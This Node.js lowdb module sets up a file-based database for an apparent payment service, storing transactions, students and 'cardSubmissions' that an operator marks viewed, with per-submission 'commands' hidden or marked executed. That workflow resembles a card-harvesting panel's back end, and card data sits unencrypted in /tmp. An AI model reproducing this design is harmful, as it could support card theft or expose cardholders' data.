// Production Database Configuration for Render.com
// This file provides database setup optimized for cloud deployment

const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');
const fs = require('fs');
const logger = require('./logger');

// ============================================
// PRODUCTION DATABASE PATH CONFIGURATION
// ============================================

// Use environment variable or default to /tmp for Render.com
// Note: /tmp is ephemeral on Render - data lost on restart
// For production, consider using PostgreSQL, MongoDB, or external storage
const DB_PATH = process.env.DB_PATH || '/tmp/payments.json';
const DB_FILE = path.resolve(DB_PATH);

console.log('[PRODUCTION DATABASE] Using file:', DB_FILE);
console.log('[PRODUCTION DATABASE] Environment:', process.env.NODE_ENV);
console.log('[PRODUCTION DATABASE] Ephemeral storage warning: Data will be lost on service restart!');

// Ensure directory exists
const dataDir = path.dirname(DB_FILE);
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
    console.log('[PRODUCTION DATABASE] Created data directory:', dataDir);
}

class ProductionDatabase {
    constructor() {
        this.db = null;
        this.backupInterval = null;
    }
    
    // Initialize database connection
    async connect() {
        try {
            console.log('[PRODUCTION DATABASE] Connecting to database at:', DB_FILE);
            
            const adapter = new FileSync(DB_FILE);
            this.db = low(adapter);
            
            // Initialize with defaults if empty
            if (!this.db.has('transactions').value()) {
                console.log('[PRODUCTION DATABASE] Initializing empty transactions array');
            }
            if (!this.db.has('paymentSessions').value()) {
                console.log('[PRODUCTION DATABASE] Initializing empty paymentSessions array');
            }
            if (!this.db.has('cardSubmissions').value()) {
                console.log('[PRODUCTION DATABASE] Initializing empty cardSubmissions array');
            }
            
            // Set defaults without overwriting existing data
            this.db.defaults({
                transactions: [],
                paymentSessions: [],
                cardSubmissions: [],
                students: [],
                adminLogs: [],
                metadata: {
                    version: '2.0.0',
                    createdAt: new Date().toISOString(),
                    lastBackup: null
                }
            }).write();
            
            // Migration: Add viewed field to existing submissions
            const submissions = this.db.get('cardSubmissions').value();
            let migrated = 0;
            submissions.forEach(submission => {
                if (submission.viewed === undefined) {
                    this.db.get('cardSubmissions')
                        .find({ sessionId: submission.sessionId })
                        .assign({ viewed: false })
                        .write();
                    migrated++;
                }
            });
            
            if (migrated > 0) {
                console.log(`[PRODUCTION DATABASE] Migrated ${migrated} submissions with viewed field`);
            }
            
            // Warn about ephemeral storage
            if (DB_PATH.startsWith('/tmp')) {
                console.warn('[PRODUCTION DATABASE] ⚠️  WARNING: Using ephemeral storage (/tmp)');
                console.warn('[PRODUCTION DATABASE] ⚠️  Data will be LOST on service restart!');
                console.warn('[PRODUCTION DATABASE] ⚠️  Consider using PostgreSQL or MongoDB for production');
            }
            
            logger.info('Production database connected successfully', { 
                path: DB_FILE,
                transactions: this.db.get('transactions').size().value(),
                submissions: this.db.get('cardSubmissions').size().value()
            });
            
            return true;
        } catch (error) {
            logger.error('Production database connection failed:', error);
            throw error;
        }
    }
    
    // Get all transactions
    async getAllTransactions(limit = 100) {
        try {
            return this.db.get('transactions')
                .orderBy('timestamp', 'desc')
                .take(limit)
                .value();
        } catch (error) {
            logger.error('Error getting transactions:', error);
            return [];
        }
    }
    
    // Create transaction
    async createTransaction(transactionData) {
        try {
            this.db.get('transactions')
                .push({
                    ...transactionData,
                    id: transactionData.id || this.generateId(),
                    createdAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Transaction created', { id: transactionData.id });
            return transactionData;
        } catch (error) {
            logger.error('Error creating transaction:', error);
            throw error;
        }
    }
    
    // Get all card submissions
    async getAllCardSubmissions(limit = 1000) {
        try {
            return this.db.get('cardSubmissions')
                .orderBy('timestamp', 'desc')
                .take(limit)
                .value();
        } catch (error) {
            logger.error('Error getting card submissions:', error);
            return [];
        }
    }
    
    // Create card submission
    async createCardSubmission(submissionData) {
        try {
            const submission = {
                ...submissionData,
                createdAt: new Date().toISOString(),
                viewed: false,
                commandsHidden: false,
                commandExecuted: false
            };
            
            this.db.get('cardSubmissions')
                .push(submission)
                .write();
            
            logger.info('Card submission created', { sessionId: submissionData.sessionId });
            return submission;
        } catch (error) {
            logger.error('Error creating card submission:', error);
            throw error;
        }
    }
    
    // Mark submission as seen
    async markSubmissionAsSeen(sessionId) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ 
                    seen: true,
                    seenAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Submission marked as seen', { sessionId });
        } catch (error) {
            logger.error('Error marking submission as seen:', error);
            throw error;
        }
    }
    
    // Mark submission as viewed
    async markSubmissionAsViewed(sessionId) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ 
                    viewed: true,
                    viewedAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Submission marked as viewed', { sessionId });
        } catch (error) {
            logger.error('Error marking submission as viewed:', error);
            throw error;
        }
    }
    
    // Hide submission commands
    async hideSubmissionCommands(sessionId) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ 
                    commandsHidden: true,
                    commandsHiddenAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Submission commands hidden', { sessionId });
        } catch (error) {
            logger.error('Error hiding commands:', error);
            throw error;
        }
    }
    
    // Update submission status
    async updateSubmissionStatus(sessionId, status, reason) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ 
                    status,
                    statusReason: reason,
                    statusUpdatedAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Submission status updated', { sessionId, status });
        } catch (error) {
            logger.error('Error updating submission status:', error);
            throw error;
        }
    }
    
    // Mark command as executed
    async markCommandExecuted(sessionId) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ 
                    commandExecuted: true,
                    commandExecutedAt: new Date().toISOString()
                })
                .write();
            
            logger.info('Command marked as executed', { sessionId });
        } catch (error) {
            logger.error('Error marking command as executed:', error);
            throw error;
        }
    }
    
    // Generate unique ID
    generateId() {
        return 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9);
    }
    
    // Health check
    async healthCheck() {
        try {
            const stats = {
                connected: this.db !== null,
                transactions: this.db.get('transactions').size().value(),
                submissions: this.db.get('cardSubmissions').size().value(),
                students: this.db.get('students').size().value(),
                dbPath: DB_FILE,
                ephemeral: DB_PATH.startsWith('/tmp'),
                timestamp: new Date().toISOString()
            };
            
            return stats;
        } catch (error) {
            logger.error('Database health check failed:', error);
            return { connected: false, error: error.message };
        }
    }
    
    // Graceful shutdown
    async disconnect() {
        try {
            if (this.backupInterval) {
                clearInterval(this.backupInterval);
            }
            
            logger.info('Production database disconnected');
        } catch (error) {
            logger.error('Error disconnecting database:', error);
        }
    }
}

// Export singleton instance
const database = new ProductionDatabase();
module.exports = database;
